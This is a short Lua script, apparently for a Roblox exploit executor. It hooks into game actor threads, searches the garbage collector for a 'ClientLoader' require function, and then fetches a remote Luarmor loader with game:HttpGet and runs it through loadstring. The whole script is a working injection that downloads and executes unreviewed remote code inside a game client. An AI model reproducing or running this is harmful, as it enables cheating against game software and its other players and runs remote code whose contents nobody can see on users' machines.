for _, thread in getactorthreads() do
    run_on_thread(thread, [=[
        for _, func in getgc(false) do
            if type(func) == "function" and islclosure(func) and debug.getinfo(func).name == "require" and string.find(debug.getinfo(func).source, "ClientLoader") then
                loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/9d0b678c6da300ebe2ee7ad262be4b64.lua"))()
            end
        end
    ]=])
end
